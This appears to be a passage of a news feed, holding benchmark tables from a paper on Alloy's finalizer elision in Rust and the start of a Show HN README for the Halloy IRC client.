<td>2.72 <span>±0.09</span></td>
<td>0.29 <span>±0.00</span></td>
</tr>
<tr>
<td>Queens</td>
<td>3.19 <span>±0.07</span></td>
<td>0.35 <span>±0.00</span></td>
</tr>
<tr>
<td>QuickSort</td>
<td>3.62 <span>±0.05</span></td>
<td>0.41 <span>±0.00</span></td>
</tr>
<tr>
<td>Recurse</td>
<td>4.27 <span>±1.91</span></td>
<td>0.33 <span>±0.00</span></td>
</tr>
<tr>
<td>Richards</td>
<td>15.51 <span>±0.89</span></td>
<td>1.31 <span>±0.01</span></td>
</tr>
<tr>
<td>Sieve</td>
<td>2.57 <span>±0.07</span></td>
<td>0.28 <span>±0.00</span></td>
</tr>
<tr>
<td>Storage</td>
<td>2.45 <span>±0.05</span></td>
<td>0.22 <span>±0.00</span></td>
</tr>
<tr>
<td>Sum</td>
<td>3.06 <span>±0.37</span></td>
<td>0.27 <span>±0.00</span></td>
</tr>
<tr>
<td>Towers</td>
<td>1.59 <span>±0.05</span></td>
<td>0.16 <span>±0.00</span></td>
</tr>
<tr>
<td>TreeSort</td>
<td>1.19 <span>±0.02</span></td>
<td>0.13</td>
</tr>
<tr>
<td>WhileLoop</td>
<td>3.26 <span>±0.08</span></td>
<td>0.24 <span>±0.01</span></td>
</tr>
</tbody>
</table>
<figcaption><span>Table 11.  </span><span>Wall-clock execution times (seconds) for each benchmark in the <span>E<sub>Elision</sub></span> experiment, shown before and after applying <span>Alloy</span>'s finalizer elision optimisation. Values show arithmetic means over 30 runs, with 99% confidence intervals.</span></figcaption>
</figure>


<figure>
<a id="x1-30038r12"></a>
<table>
<thead>
<tr>
<th></th>
<th colspan="2">User time (s)</th>
</tr>
<tr>
<th></th>
<th>Before elision</th>
<th>After elision</th>
</tr>
</thead>
<tbody>
<tr data-suite="alacritty">
<td colspan="3"><span>Alacritty</span> <span>▶</span></td>
</tr>
<tr>
<td>Cur. Motion</td>
<td>1.08 <span>±0.06</span></td>
<td>1.12 <span>±0.05</span></td>
</tr>
<tr>
<td>Dense Cells</td>
<td>6.70 <span>±0.12</span></td>
<td>6.68 <span>±0.13</span></td>
</tr>
<tr>
<td>Light Cells</td>
<td>0.34 <span>±0.04</span></td>
<td>0.33 <span>±0.04</span></td>
</tr>
<tr>
<td>Scroll</td>
<td>0.12 <span>±0.01</span></td>
<td>0.12 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll (fullscreen)</td>
<td>0.27 <span>±0.03</span></td>
<td>0.26 <span>±0.03</span></td>
</tr>
<tr>
<td>Scroll Btm</td>
<td>0.15 <span>±0.01</span></td>
<td>0.15 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll Btm (small)</td>
<td>0.15 <span>±0.01</span></td>
<td>0.14 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll Top</td>
<td>0.12 <span>±0.01</span></td>
<td>0.12 <span>±0.06</span></td>
</tr>
<tr>
<td>Scroll Top (small)</td>
<td>0.15 <span>±0.01</span></td>
<td>0.14 <span>±0.01</span></td>
</tr>
<tr>
<td>Unicode</td>
<td>0.13 <span>±0.02</span></td>
<td>0.13 <span>±0.02</span></td>
</tr>

<tr data-suite="fd">
<td colspan="3"><span>fd</span> <span>▶</span></td>
</tr>
<tr>
<td>Cmd Exec.</td>
<td>1.13 <span>±0.01</span></td>
<td>1.13 <span>±0.02</span></td>
</tr>
<tr>
<td>Cmd Exec. (large)</td>
<td>1.10 <span>±0.02</span></td>
<td>1.11 <span>±0.02</span></td>
</tr>
<tr>
<td>File Extension</td>
<td>0.05 <span>±0.01</span></td>
<td>0.04 <span>±0.00</span></td>
</tr>
<tr>
<td>File Type</td>
<td>0.04 <span>±0.00</span></td>
<td>0.04 <span>±0.01</span></td>
</tr>
<tr>
<td>No Pattern</td>
<td>0.27 <span>±0.02</span></td>
<td>0.30 <span>±0.02</span></td>
</tr>
<tr>
<td>Simple</td>
<td>0.19 <span>±0.01</span></td>
<td>0.20 <span>±0.01</span></td>
</tr>
<tr>
<td>Simple (-HI)</td>
<td>0.04 <span>±0.01</span></td>
<td>0.04 <span>±0.01</span></td>
</tr>

<tr data-suite="som-rs-ast">
<td colspan="3"><span>som-rs-ast</span> <span>▶</span></td>
</tr>
<tr>
<td>Bounce</td>
<td>11.15 <span>±0.41</span></td>
<td>1.02 <span>±0.01</span></td>
</tr>
<tr>
<td>BubbleSort</td>
<td>7.88 <span>±0.40</span></td>
<td>0.90 <span>±0.01</span></td>
</tr>
<tr>
<td>DeltaBlue</td>
<td>11.72 <span>±0.21</span></td>
<td>1.15 <span>±0.01</span></td>
</tr>
<tr>
<td>Dispatch</td>
<td>9.15 <span>±0.63</span></td>
<td>1.03 <span>±0.01</span></td>
</tr>
<tr>
<td>Fannkuch</td>
<td>9.60 <span>±0.12</span></td>
<td>1.12 <span>±0.03</span></td>
</tr>
<tr>
<td>Fibonacci</td>
<td>26.41 <span>±1.82</span></td>
<td>1.53 <span>±0.01</span></td>
</tr>
<tr>
<td>FieldLoop</td>
<td>6.42 <span>±0.17</span></td>
<td>1.25 <span>±0.01</span></td>
</tr>
<tr>
<td>GraphSearch</td>
<td>3.92 <span>±0.07</span></td>
<td>0.45 <span>±0.01</span></td>
</tr>
<tr>
<td>IntegerLoop</td>
<td>8.23 <span>±0.13</span></td>
<td>0.90 <span>±0.01</span></td>
</tr>
<tr>
<td>JsonSmall</td>
<td>16.08 <span>±0.75</span></td>
<td>1.32 <span>±0.01</span></td>
</tr>
<tr>
<td>List</td>
<td>5.79 <span>±0.09</span></td>
<td>0.57 <span>±0.00</span></td>
</tr>
<tr>
<td>Loop</td>
<td>8.51 <span>±0.17</span></td>
<td>0.89 <span>±0.01</span></td>
</tr>
<tr>
<td>Mandelbrot</td>
<td>6.62 <span>±0.12</span></td>
<td>0.73 <span>±0.01</span></td>
</tr>
<tr>
<td>NBody</td>
<td>3.98 <span>±0.15</span></td>
<td>0.40 <span>±0.00</span></td>
</tr>
<tr>
<td>PageRank</td>
<td>3.73 <span>±0.07</span></td>
<td>0.47 <span>±0.00</span></td>
</tr>
<tr>
<td>Permute</td>
<td>9.96 <span>±0.34</span></td>
<td>0.96 <span>±0.02</span></td>
</tr>
<tr>
<td>Queens</td>
<td>13.04 <span>±0.33</span></td>
<td>1.27 <span>±0.02</span></td>
</tr>
<tr>
<td>QuickSort</td>
<td>16.43 <span>±0.65</span></td>
<td>1.38 <span>±0.02</span></td>
</tr>
<tr>
<td>Recurse</td>
<td>11.18 <span>±0.28</span></td>
<td>0.98 <span>±0.00</span></td>
</tr>
<tr>
<td>Richards</td>
<td>109.49 <span>±10.34</span></td>
<td>3.95 <span>±0.08</span></td>
</tr>
<tr>
<td>Sieve</td>
<td>10.49 <span>±0.18</span></td>
<td>1.00 <span>±0.01</span></td>
</tr>
<tr>
<td>Storage</td>
<td>7.70 <span>±0.12</span></td>
<td>0.74 <span>±0.01</span></td>
</tr>
<tr>
<td>Sum</td>
<td>8.27 <span>±0.14</span></td>
<td>0.89 <span>±0.01</span></td>
</tr>
<tr>
<td>Towers</td>
<td>4.61 <span>±0.14</span></td>
<td>0.49 <span>±0.01</span></td>
</tr>
<tr>
<td>TreeSort</td>
<td>5.90 <span>±0.35</span></td>
<td>0.44 <span>±0.00</span></td>
</tr>
<tr>
<td>WhileLoop</td>
<td>6.74 <span>±0.20</span></td>
<td>0.76 <span>±0.01</span></td>
</tr>

<tr data-suite="grmtools">
<td colspan="3"><span>grmtools</span> <span>▶</span></td>
</tr>
<tr>
<td>Eclipse</td>
<td>5.81 <span>±0.07</span></td>
<td>3.42 <span>±0.06</span></td>
</tr>
<tr>
<td>Hadoop</td>
<td>5.27 <span>±0.04</span></td>
<td>2.96 <span>±0.05</span></td>
</tr>
<tr>
<td>Jenkins</td>
<td>5.21 <span>±0.04</span></td>
<td>2.86 <span>±0.01</span></td>
</tr>
<tr>
<td>Spring</td>
<td>4.94 <span>±0.05</span></td>
<td>2.54 <span>±0.01</span></td>
</tr>

<tr data-suite="ripgrep">
<td colspan="3"><span>Ripgrep</span> <span>▶</span></td>
</tr>
<tr>
<td>Alternates</td>
<td>0.58 <span>±0.02</span></td>
<td>0.50 <span>±0.02</span></td>
</tr>
<tr>
<td>Alternates (-i)</td>
<td>0.72 <span>±0.02</span></td>
<td>0.64 <span>±0.02</span></td>
</tr>
<tr>
<td>Literal</td>
<td>0.53 <span>±0.02</span></td>
<td>0.44 <span>±0.02</span></td>
</tr>
<tr>
<td>Literal (-i)</td>
<td>0.59 <span>±0.02</span></td>
<td>0.51 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal (default)</td>
<td>0.48 <span>±0.02</span></td>
<td>0.40 <span>±0.02</span></td>
</tr>
<tr>
<td>Literal (mmap)</td>
<td>0.63 <span>±0.02</span></td>
<td>0.53 <span>±0.02</span></td>
</tr>
<tr>
<td>Literal (mmap, -i)</td>
<td>0.65 <span>±0.02</span></td>
<td>0.57 <span>±0.02</span></td>
</tr>
<tr>
<td>Literal (regex)</td>
<td>0.52 <span>±0.02</span></td>
<td>0.43 <span>±0.01</span></td>
</tr>
<tr>
<td>UTF Greek</td>
<td>2.70 <span>±0.02</span></td>
<td>2.66 <span>±0.03</span></td>
</tr>
<tr>
<td>UTF Greek (-i)</td>
<td>2.71 <span>±0.03</span></td>
<td>2.67 <span>±0.02</span></td>
</tr>
<tr>
<td>UTF Word</td>
<td>0.53 <span>±0.02</span></td>
<td>0.42 <span>±0.02</span></td>
</tr>
<tr>
<td>UTF Word (alt.)</td>
<td>0.52 <span>±0.02</span></td>
<td>0.43 <span>±0.02</span></td>
</tr>
<tr>
<td>Word</td>
<td>0.51 <span>±0.02</span></td>
<td>0.44 <span>±0.02</span></td>
</tr>

<tr data-suite="som-rs-bc">
<td colspan="3"><span>som-rs-bc</span> <span>▶</span></td>
</tr>
<tr>
<td>Bounce</td>
<td>4.34 <span>±0.04</span></td>
<td>0.30 <span>±0.00</span></td>
</tr>
<tr>
<td>BubbleSort</td>
<td>3.76 <span>±0.05</span></td>
<td>0.29 <span>±0.00</span></td>
</tr>
<tr>
<td>DeltaBlue</td>
<td>5.76 <span>±0.11</span></td>
<td>0.36 <span>±0.00</span></td>
</tr>
<tr>
<td>Dispatch</td>
<td>4.91 <span>±0.35</span></td>
<td>0.29 <span>±0.00</span></td>
</tr>
<tr>
<td>Fannkuch</td>
<td>3.85 <span>±0.29</span></td>
<td>0.30 <span>±0.00</span></td>
</tr>
<tr>
<td>Fibonacci</td>
<td>6.15 <span>±0.17</span></td>
<td>0.40 <span>±0.00</span></td>
</tr>
<tr>
<td>FieldLoop</td>
<td>3.14 <span>±0.15</span></td>
<td>0.45 <span>±0.01</span></td>
</tr>
<tr>
<td>GraphSearch</td>
<td>1.54 <span>±0.03</span></td>
<td>0.12 <span>±0.00</span></td>
</tr>
<tr>
<td>IntegerLoop</td>
<td>3.94 <span>±0.15</span></td>
<td>0.26 <span>±0.00</span></td>
</tr>
<tr>
<td>JsonSmall</td>
<td>6.70 <span>±0.73</span></td>
<td>0.41 <span>±0.01</span></td>
</tr>
<tr>
<td>List</td>
<td>3.72 <span>±0.09</span></td>
<td>0.24 <span>±0.01</span></td>
</tr>
<tr>
<td>Loop</td>
<td>4.11 <span>±0.17</span></td>
<td>0.28 <span>±0.00</span></td>
</tr>
<tr>
<td>Mandelbrot</td>
<td>2.91 <span>±0.13</span></td>
<td>0.23 <span>±0.00</span></td>
</tr>
<tr>
<td>NBody</td>
<td>1.72 <span>±0.06</span></td>
<td>0.12 <span>±0.00</span></td>
</tr>
<tr>
<td>PageRank</td>
<td>1.51 <span>±0.02</span></td>
<td>0.13 <span>±0.00</span></td>
</tr>
<tr>
<td>Permute</td>
<td>3.84 <span>±0.09</span></td>
<td>0.28 <span>±0.00</span></td>
</tr>
<tr>
<td>Queens</td>
<td>4.53 <span>±0.07</span></td>
<td>0.35 <span>±0.00</span></td>
</tr>
<tr>
<td>QuickSort</td>
<td>5.28 <span>±0.09</span></td>
<td>0.40 <span>±0.00</span></td>
</tr>
<tr>
<td>Recurse</td>
<td>5.84 <span>±1.85</span></td>
<td>0.33 <span>±0.00</span></td>
</tr>
<tr>
<td>Richards</td>
<td>20.23 <span>±0.81</span></td>
<td>1.30 <span>±0.01</span></td>
</tr>
<tr>
<td>Sieve</td>
<td>3.76 <span>±0.12</span></td>
<td>0.27 <span>±0.01</span></td>
</tr>
<tr>
<td>Storage</td>
<td>3.23 <span>±0.05</span></td>
<td>0.22 <span>±0.00</span></td>
</tr>
<tr>
<td>Sum</td>
<td>4.03 <span>±0.36</span></td>
<td>0.26 <span>±0.00</span></td>
</tr>
<tr>
<td>Towers</td>
<td>2.20 <span>±0.05</span></td>
<td>0.16 <span>±0.00</span></td>
</tr>
<tr>
<td>TreeSort</td>
<td>1.71 <span>±0.03</span></td>
<td>0.13 <span>±0.00</span></td>
</tr>
<tr>
<td>WhileLoop</td>
<td>3.90 <span>±0.09</span></td>
<td>0.24 <span>±0.01</span></td>
</tr>
</tbody>
</table>
<figcaption><span>Table 12.  </span><span>User times (seconds) for each benchmark in the <span>E<sub>Elision</sub></span> experiment, shown before and after applying <span>Alloy</span>'s finalizer elision optimisation. Values show arithmetic means over 30 runs, with 99% confidence intervals.</span></figcaption>
</figure>

<figure>
<a id="x1-30039r13"></a>
<table>
<thead>
<tr>
<th></th>
<th colspan="2">Avg. heap footprint (MiB)</th>
</tr>
<tr>
<th></th>
<th>Before elision</th>
<th>After elision</th>
</tr>
</thead>
<tbody>
<tr data-suite="alacritty">
<td colspan="3"><span>Alacritty</span> <span>▶</span></td>
</tr>
<tr>
<td>Cur. Motion</td>
<td>3.76 <span>±0.06</span></td>
<td>3.79 <span>±0.06</span></td>
</tr>
<tr>
<td>Dense Cells</td>
<td>3.74 <span>±0.06</span></td>
<td>3.74 <span>±0.06</span></td>
</tr>
<tr>
<td>Light Cells</td>
<td>3.76 <span>±0.08</span></td>
<td>3.73 <span>±0.07</span></td>
</tr>
<tr>
<td>Scroll</td>
<td>3.88 <span>±0.13</span></td>
<td>3.87 <span>±0.12</span></td>
</tr>
<tr>
<td>Scroll (fullscreen)</td>
<td>6.46 <span>±0.28</span></td>
<td>6.46 <span>±0.34</span></td>
</tr>
<tr>
<td>Scroll Btm</td>
<td>3.72 <span>±0.07</span></td>
<td>3.73 <span>±0.07</span></td>
</tr>
<tr>
<td>Scroll Btm (small)</td>
<td>3.75 <span>±0.05</span></td>
<td>3.74 <span>±0.07</span></td>
</tr>
<tr>
<td>Scroll Top</td>
<td>3.78 <span>±0.08</span></td>
<td>3.75 <span>±0.10</span></td>
</tr>
<tr>
<td>Scroll Top (small)</td>
<td>3.76 <span>±0.06</span></td>
<td>3.71 <span>±0.08</span></td>
</tr>
<tr>
<td>Unicode</td>
<td>3.73 <span>±0.15</span></td>
<td>3.77 <span>±0.09</span></td>
</tr>

<tr data-suite="fd">
<td colspan="3"><span>fd</span> <span>▶</span></td>
</tr>
<tr>
<td>execution</td>
<td>17.18 <span>±0.33</span></td>
<td>17.89 <span>±0.87</span></td>
</tr>
<tr>
<td>extension</td>
<td>13.52 <span>±0.75</span></td>
<td>13.68 <span>±0.84</span></td>
</tr>
<tr>
<td>hi</td>
<td>15.14 <span>±0.36</span></td>
<td>14.99 <span>±0.59</span></td>
</tr>
<tr>
<td>output</td>
<td>17.54 <span>±0.65</span></td>
<td>17.47 <span>±0.53</span></td>
</tr>
<tr>
<td>pattern</td>
<td>37.79 <span>±5.22</span></td>
<td>38.03 <span>±5.25</span></td>
</tr>
<tr>
<td>type</td>
<td>15.80 <span>±0.40</span></td>
<td>15.84 <span>±0.38</span></td>
</tr>

<tr data-suite="som-rs-ast">
<td colspan="3"><span>som-rs-ast</span> <span>▶</span></td>
</tr>
<tr>
<td>bounce</td>
<td>309.85 <span>±43.90</span></td>
<td>362.44 <span>±7.24</span></td>
</tr>
<tr>
<td>bubblesort</td>
<td>334.97 <span>±6.55</span></td>
<td>209.99 <span>±3.88</span></td>
</tr>
<tr>
<td>deltablue</td>
<td>305.24 <span>±31.74</span></td>
<td>310.83 <span>±5.32</span></td>
</tr>
<tr>
<td>dispatch</td>
<td>345.26 <span>±18.67</span></td>
<td>329.90 <span>±4.22</span></td>
</tr>
<tr>
<td>fannkuch</td>
<td>412.43 <span>±5.54</span></td>
<td>363.19 <span>±8.31</span></td>
</tr>
<tr>
<td>fibonacci</td>
<td>382.32 <span>±22.98</span></td>
<td>587.04 <span>±4.00</span></td>
</tr>
<tr>
<td>fieldloop</td>
<td>326.47 <span>±8.38</span></td>
<td>300.93 <span>±5.66</span></td>
</tr>
<tr>
<td>graphsearch</td>
<td>100.82 <span>±4.86</span></td>
<td>61.15 <span>±0.26</span></td>
</tr>
<tr>
<td>integerloop</td>
<td>323.50 <span>±16.42</span></td>
<td>320.62 <span>±0.44</span></td>
</tr>
<tr>
<td>jsonsmall</td>
<td>257.67 <span>±34.84</span></td>
<td>316.56 <span>±0.93</span></td>
</tr>
<tr>
<td>list</td>
<td>236.78 <span>±5.27</span></td>
<td>156.13 <span>±4.11</span></td>
</tr>
<tr>
<td>loop</td>
<td>332.20 <span>±14.75</span></td>
<td>326.89 <span>±7.76</span></td>
</tr>
<tr>
<td>mandelbrot</td>
<td>276.68 <span>±4.14</span></td>
<td>236.49 <span>±2.42</span></td>
</tr>
<tr>
<td>nbody</td>
<td>151.00 <span>±2.63</span></td>
<td>137.42 <span>±2.78</span></td>
</tr>
<tr>
<td>pagerank</td>
<td>193.25 <span>±1.12</span></td>
<td>168.02 <span>±0.95</span></td>
</tr>
<tr>
<td>permute</td>
<td>284.84 <span>±43.08</span></td>
<td>371.67 <span>±11.43</span></td>
</tr>
<tr>
<td>queens</td>
<td>278.89 <span>±12.36</span></td>
<td>288.03 <span>±2.63</span></td>
</tr>
<tr>
<td>quicksort</td>
<td>515.72 <span>±20.82</span></td>
<td>424.56 <span>±18.48</span></td>
</tr>
<tr>
<td>recurse</td>
<td>429.81 <span>±12.37</span></td>
<td>410.97 <span>±5.30</span></td>
</tr>
<tr>
<td>richards</td>
<td>1187.31 <span>±98.12</span></td>
<td>1472.67 <span>±31.17</span></td>
</tr>
<tr>
<td>sieve</td>
<td>355.11 <span>±17.79</span></td>
<td>360.95 <span>±6.06</span></td>
</tr>
<tr>
<td>storage</td>
<td>196.36 <span>±9.70</span></td>
<td>193.06 <span>±6.60</span></td>
</tr>
<tr>
<td>sum</td>
<td>320.61 <span>±11.55</span></td>
<td>298.24 <span>±2.27</span></td>
</tr>
<tr>
<td>towers</td>
<td>174.90 <span>±4.23</span></td>
<td>175.82 <span>±0.26</span></td>
</tr>
<tr>
<td>treesort</td>
<td>92.65 <span>±4.87</span></td>
<td>98.82 <span>±0.92</span></td>
</tr>
<tr>
<td>whileloop</td>
<td>272.66 <span>±10.05</span></td>
<td>253.07 <span>±3.60</span></td>
</tr>
<tr data-suite="grmtools">
<td colspan="3"><span>grmtools</span> <span>▶</span></td>
</tr>
<tr>
<td>Eclipse</td>
<td>1993.86 <span>±9.04</span></td>
<td>1069.95 <span>±28.40</span></td>
</tr>
<tr>
<td>Hadoop</td>
<td>1882.88 <span>±1.55</span></td>
<td>800.15 <span>±48.62</span></td>
</tr>
<tr>
<td>Jenkins</td>
<td>1876.35 <span>±14.92</span></td>
<td>962.16 <span>±29.20</span></td>
</tr>
<tr>
<td>Spring</td>
<td>1752.72 <span>±1.68</span></td>
<td>1036.27 <span>±19.48</span></td>
</tr>

<tr data-suite="ripgrep">
<td colspan="3"><span>Ripgrep</span> <span>▶</span></td>
</tr>
<tr>
<td>Alternates</td>
<td>28.23 <span>±1.59</span></td>
<td>15.80 <span>±0.40</span></td>
</tr>
<tr>
<td>Alternates (-i)</td>
<td>29.52 <span>±1.66</span></td>
<td>17.50 <span>±0.66</span></td>
</tr>
<tr>
<td>Literal</td>
<td>25.14 <span>±1.52</span></td>
<td>15.26 <span>±0.33</span></td>
</tr>
<tr>
<td>Literal (-i)</td>
<td>26.69 <span>±1.56</span></td>
<td>18.17 <span>±0.41</span></td>
</tr>
<tr>
<td>Literal (default)</td>
<td>25.62 <span>±1.59</span></td>
<td>15.25 <span>±0.39</span></td>
</tr>
<tr>
<td>Literal (mmap)</td>
<td>26.91 <span>±1.78</span></td>
<td>16.03 <span>±0.39</span></td>
</tr>
<tr>
<td>Literal (mmap, -i)</td>
<td>28.72 <span>±1.66</span></td>
<td>17.34 <span>±0.24</span></td>
</tr>
<tr>
<td>Literal (regex)</td>
<td>25.87 <span>±2.01</span></td>
<td>15.05 <span>±0.46</span></td>
</tr>
<tr>
<td>UTF Greek</td>
<td>26.57 <span>±1.40</span></td>
<td>17.43 <span>±0.47</span></td>
</tr>
<tr>
<td>UTF Greek (-i)</td>
<td>26.85 <span>±1.54</span></td>
<td>18.04 <span>±0.65</span></td>
</tr>
<tr>
<td>UTF Word</td>
<td>28.03 <span>±1.57</span></td>
<td>18.13 <span>±0.14</span></td>
</tr>
<tr>
<td>UTF Word (alt.)</td>
<td>25.56 <span>±1.60</span></td>
<td>15.48 <span>±0.46</span></td>
</tr>
<tr>
<td>Word</td>
<td>29.35 <span>±2.05</span></td>
<td>15.82 <span>±0.51</span></td>
</tr>

<tr data-suite="som-rs-bc">
<td colspan="3"><span>som-rs-bc</span> <span>▶</span></td>
</tr>
<tr>
<td>bounce</td>
<td>138.59 <span>±5.18</span></td>
<td>134.24 <span>±0.22</span></td>
</tr>
<tr>
<td>bubblesort</td>
<td>121.69 <span>±6.72</span></td>
<td>115.25 <span>±0.03</span></td>
</tr>
<tr>
<td>deltablue</td>
<td>186.12 <span>±1.32</span></td>
<td>135.10 <span>±2.09</span></td>
</tr>
<tr>
<td>dispatch</td>
<td>168.63 <span>±7.00</span></td>
<td>137.08 <span>±0.01</span></td>
</tr>
<tr>
<td>fannkuch</td>
<td>139.94 <span>±5.95</span></td>
<td>115.98 <span>±0.02</span></td>
</tr>
<tr>
<td>fibonacci</td>
<td>205.88 <span>±10.08</span></td>
<td>175.88 <span>±0.03</span></td>
</tr>
<tr>
<td>fieldloop</td>
<td>98.52 <span>±4.07</span></td>
<td>89.07 <span>±0.01</span></td>
</tr>
<tr>
<td>graphsearch</td>
<td>45.81 <span>±1.21</span></td>
<td>24.33 <span>±0.74</span></td>
</tr>
<tr>
<td>integerloop</td>
<td>133.10 <span>±6.16</span></td>
<td>117.24 <span>±0.01</span></td>
</tr>
<tr>
<td>jsonsmall</td>
<td>164.80 <span>±5.83</span></td>
<td>142.20 <span>±5.29</span></td>
</tr>
<tr>
<td>list</td>
<td>106.38 <span>±7.84</span></td>
<td>98.95 <span>±0.04</span></td>
</tr>
<tr>
<td>loop</td>
<td>144.73 <span>±6.09</span></td>
<td>120.89 <span>±0.00</span></td>
</tr>
<tr>
<td>mandelbrot</td>
<td>90.31 <span>±4.84</span></td>
<td>80.51 <span>±0.03</span></td>
</tr>
<tr>
<td>nbody</td>
<td>58.61 <span>±1.77</span></td>
<td>48.15 <span>±0.03</span></td>
</tr>
<tr>
<td>pagerank</td>
<td>69.21 <span>±0.08</span></td>
<td>51.90 <span>±0.46</span></td>
</tr>
<tr>
<td>permute</td>
<td>126.65 <span>±5.94</span></td>
<td>109.74 <span>±0.03</span></td>
</tr>
<tr>
<td>queens</td>
<td>157.93 <span>±5.89</span></td>
<td>134.31 <span>±0.02</span></td>
</tr>
<tr>
<td>quicksort</td>
<td>183.42 <span>±4.54</span></td>
<td>175.50 <span>±0.04</span></td>
</tr>
<tr>
<td>recurse</td>
<td>169.34 <span>±7.22</span></td>
<td>146.41 <span>±0.00</span></td>
</tr>
<tr>
<td>richards</td>
<td>582.34 <span>±41.87</span></td>
<td>487.95 <span>±0.03</span></td>
</tr>
<tr>
<td>sieve</td>
<td>131.11 <span>±5.83</span></td>
<td>114.14 <span>±3.04</span></td>
</tr>
<tr>
<td>storage</td>
<td>71.95 <span>±2.32</span></td>
<td>85.36 <span>±3.26</span></td>
</tr>
<tr>
<td>sum</td>
<td>136.99 <span>±5.40</span></td>
<td>117.56 <span>±0.00</span></td>
</tr>
<tr>
<td>towers</td>
<td>71.09 <span>±3.09</span></td>
<td>58.84 <span>±0.03</span></td>
</tr>
<tr>
<td>treesort</td>
<td>57.12 <span>±2.12</span></td>
<td>44.90 <span>±1.02</span></td>
</tr>
<tr>
<td>whileloop</td>
<td>132.37 <span>±2.45</span></td>
<td>96.28 <span>±0.02</span></td>
</tr>
</tbody>
</table>
<figcaption><span>Table 13.  </span><span>Average heap footprint (MiB) across benchmarks in the <span>E<sub>Elision</sub></span> experiment, measured before and after applying <span>Alloy</span>'s finalizer elision optimisation. Values are arithmetic means over 30 runs with resampled traces from heaptrack, with 99% confidence intervals (see Section 8.1.4 for details).</span></figcaption>
</figure>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Halloy – the modern IRC client I hope will outlive me (264 pts)]]></title>
            <link>https://github.com/squidowl/halloy</link>
            <guid>45590949</guid>
            <pubDate>Wed, 15 Oct 2025 11:45:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/squidowl/halloy">https://github.com/squidowl/halloy</a>, See on <a href="https://news.ycombinator.com/item?id=45590949">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Halloy - IRC Client</h2><a id="user-content-halloy---irc-client" aria-label="Permalink: Halloy - IRC Client" href="#halloy---irc-client"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/squidowl/halloy/blob/main/assets/banner.png"><img src="https://github.com/squidowl/halloy/raw/main/assets/banner.png" alt="banner" title="Icon by Rune Seir"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/squidowl/halloy/blob/main/assets/animation.gif"><img src="https://github.com/squidowl/halloy/raw/main/assets/animation.gif" alt="halloy" data-animated-image=""></a></p>
<p dir="auto">Halloy is an open-source IRC client written in Rust, with the Iced GUI library. It aims to provide a simple and fast client for Mac, Windows, and Linux platforms.</p>
<ul dir="auto">
<li>Documentation for latest release: <a href="https://halloy.chat/" rel="nofollow">https://halloy.chat</a>.</li>
<li>Documentation for main branch (when building from source): <a href="https://unstable.halloy.chat/" rel="nofollow">https://unstable.halloy.chat</a>.</li>
</ul>
<p dir="auto">Join <strong>#halloy</strong> on libera.chat if you have questions or looking for help.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto"><a href="https://halloy.chat/installation.html" rel="nofollow">Installation documentation</a></p>
<a href="https://repology.org/project/halloy/versions" rel="nofollow">
    <img src="https://camo.githubusercontent.com/28d07a7d9f9939999c09e039a86cc72e826d94eed28199e99cb0f193bb13da0a/68747470733a2f2f7265706f6c6f67792e6f72672f62616467652f766572746963616c2d616c6c7265706f732f68616c6c6f792e737667" alt="Packaging status" data-canonical-src="https://repology.org/badge/vertical-allrepos/halloy.svg">
</a>
<p dir="auto">Halloy is also available from <a href="https://flathub.org/apps/org.squidowl.halloy" rel="nofollow">Flathub</a> and <a href="https://snapcraft.io/halloy" rel="nofollow">Snap Store</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li>IRCv3.2 capabilities
<ul dir="auto">
<li><a href="https://ircv3.net/specs/extensions/account-notify" rel="nofollow">account-notify</a></li>
<li><a href="https://ircv3.net/specs/extensions/away-notify" rel="nofollow">away-notify</a></li>
<li><a href="https://ircv3.net/specs/extensions/batch" rel="nofollow">batch</a></li>
<li><a href="https://ircv3.net/specs/extensions/capability-negotiation.html#cap-notify" rel="nofollow">cap-notify</a></li>
<li><a href="https://ircv3.net/specs/extensions/chathistory" rel="nofollow">chathistory</a></li>
<li><a href="https://ircv3.net/specs/extensions/chghost" rel="nofollow">chghost</a></li>
<li><a href="https://ircv3.net/specs/extensions/echo-message" rel="nofollow">echo-message</a></li>
<li><a href="https://ircv3.net/specs/extensions/extended-join" rel="nofollow">extended-join</a></li>
<li><a href="https://ircv3.net/specs/extensions/invite-notify" rel="nofollow">invite-notify</a></li>
<li><a href="https://ircv3.net/specs/extensions/labeled-response" rel="nofollow">labeled-response</a></li>
<li><a href="https://ircv3.net/specs/extensions/message-tags" rel="nofollow">message-tags</a></li>
<li><a href="https://ircv3.net/specs/extensions/monitor" rel="nofollow">Monitor</a></li>
<li><a href="https://ircv3.net/specs/extensions/message-ids" rel="nofollow">msgid</a></li>
<li><a href="https://ircv3.net/specs/extensions/multi-prefix" rel="nofollow">multi-prefix</a></li>
<li><a href="https://ircv3.net/specs/extensions/read-marker" rel="nofollow">read-marker</a></li>
<li><a href="https://ircv3.net/specs/extensions/sasl-3.1" rel="nofollow">sasl-3.1</a></li>
<li><a href="https://ircv3.net/specs/extensions/server-time" rel="nofollow">server-time</a></li>
<li><a href="https://ircv3.net/specs/extensions/setname.html" rel="nofollow">setname</a></li>
<li><a href="https://ircv3.net/specs/extensions/standard-replies" rel="nofollow">Standard Replies</a></li>
<li><a href="https://ircv3.net/specs/extensions/userhost-in-names" rel="nofollow">userhost-in-names</a></li>
<li><a href="https://ircv3.net/specs/extensions/utf8-only" rel="nofollow"><code>UTF8ONLY</code></a></li>
<li><a href="https://ircv3.net/specs/extensions/whox" rel="nofollow"><code>WHOX</code></a></li>
</ul>
</li>
<li>SASL support</li>
<li>DCC Send</li>
<li>Keyboard shortcuts</li>
<li>Auto-completion for nicknames, commands, and channels</li>
<li>Notifications support</li>
<li>Multiple channels at the same time across servers</li>
<li>Command bar for for quick actions</li>
<li>Custom themes</li>
